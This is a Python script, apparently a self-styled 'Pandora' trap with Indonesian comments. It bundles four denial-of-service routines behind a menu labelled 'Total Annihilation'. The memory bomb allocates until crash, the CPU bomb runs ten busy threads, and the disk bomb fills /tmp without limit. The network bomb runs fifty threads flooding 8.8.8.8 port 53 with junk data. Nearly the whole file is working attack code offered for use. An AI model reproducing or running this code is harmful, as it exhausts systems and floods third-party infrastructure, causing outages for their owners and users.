#!/usr/bin/env python3
"""
Pandora Toxic Payload - Python Memory Trap
Author: @nanang55550-star
"""

import sys
import time
import threading
import random

class PandoraTrap:
    """
    Memory trap untuk penyerang yang pake Python
    """
    
    def __init__(self):
        self.data = []
        self.threads = []
        self.running = True
        
    def memory_bomb(self):
        """Boom! Memory penuh"""
        print("💀 PANDORA TRAP ACTIVATED 💀")
        print("Target: Python Memory Exhaustion")
        
        try:
            while self.running:
                # Allocate 10MB setiap iterasi
                chunk = 'X' * (10 * 1024 * 1024)
                self.data.append(chunk)
                print(f"[*] Allocated: {len(self.data) * 10} MB", end='\r')
                
                if len(self.data) > 100:
                    print("\n[!] Memory threshold reached")
                    break
                    
        except MemoryError:
            print("\n[🔥] Memory exhausted! Target system unstable.")
            
    def cpu_bomb(self):
        """Bakar CPU"""
        print("\n[*] Deploying CPU bomb...")
        
        def burn_cpu():
            while self.running:
                x = random.random() ** random.random()
                
        for i in range(10):
            t = threading.Thread(target=burn_cpu)
            t.daemon = True
            t.start()
            self.threads.append(t)
            
    def disk_bomb(self):
        """Isi disk dengan file sampah"""
        print("\n[*] Deploying disk bomb...")
        
        try:
            with open('/tmp/pandora_garbage.txt', 'w') as f:
                while self.running:
                    f.write('X' * (1024 * 1024))  # 1MB setiap iterasi
                    f.flush()
        except:
            pass
            
    def network_bomb(self):
        """Flood network"""
        print("\n[*] Deploying network bomb...")
        
        def flood():
            import socket
            while self.running:
                try:
                    s = socket.socket()
                    s.connect(('8.8.8.8', 53))
                    s.send(b'X' * 65535)
                    s.close()
                except:
                    pass
                    
        for i in range(50):
            t = threading.Thread(target=flood)
            t.daemon = True
            t.start()
            self.threads.append(t)
            
    def activate_all(self):
        """Aktifkan semua bom sekaligus"""
        print("""
╔═══════════════════════════════════════════════════════════╗
║     💀 PANDORA FULL SYSTEM TRAP ACTIVATED 💀              ║
╠═══════════════════════════════════════════════════════════╣
║ • Memory Bomb: Allocate until crash                       ║
║ • CPU Bomb: 10 threads burning processor                  ║
║ • Disk Bomb: Fill storage with garbage                    ║
║ • Network Bomb: 50 threads flooding                        ║
╚═══════════════════════════════════════════════════════════╝
        """)
        
        threads = []
        
        # Memory bomb di thread terpisah
        t1 = threading.Thread(target=self.memory_bomb)
        t1.daemon = True
        t1.start()
        threads.append(t1)
        
        # CPU bomb
        t2 = threading.Thread(target=self.cpu_bomb)
        t2.daemon = True
        t2.start()
        threads.append(t2)
        
        # Disk bomb
        t3 = threading.Thread(target=self.disk_bomb)
        t3.daemon = True
        t3.start()
        threads.append(t3)
        
        # Network bomb
        t4 = threading.Thread(target=self.network_bomb)
        t4.daemon = True
        t4.start()
        threads.append(t4)
        
        print("\n[+] All traps deployed. Waiting for system collapse...")
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            self.running = False
            print("\n\n[*] Traps deactivated.")
            
if __name__ == "__main__":
    trap = PandoraTrap()
    
    # Menu pilihan
    print("""
╔═══════════════════════════════════════════════════════════╗
║              PANDORA PYTHON TRAP MENU                     ║
╠═══════════════════════════════════════════════════════════╣
║ 1. Memory Bomb Only                                        ║
║ 2. CPU Bomb Only                                           ║
║ 3. Disk Bomb Only                                          ║
║ 4. Network Bomb Only                                       ║
║ 5. ACTIVATE ALL (Total Annihilation)                       ║
╚═══════════════════════════════════════════════════════════╝
    """)
    
    choice = input("Select trap [1-5]: ")
    
    if choice == '1':
        trap.memory_bomb()
    elif choice == '2':
        trap.cpu_bomb()
        input("Press Enter to stop CPU bomb...")
        trap.running = False
    elif choice == '3':
        trap.disk_bomb()
        input("Press Enter to stop disk bomb...")
        trap.running = False
    elif choice == '4':
        trap.network_bomb()
        input("Press Enter to stop network bomb...")
        trap.running = False
    elif choice == '5':
        trap.activate_all()
    else:
        print("Invalid choice!")
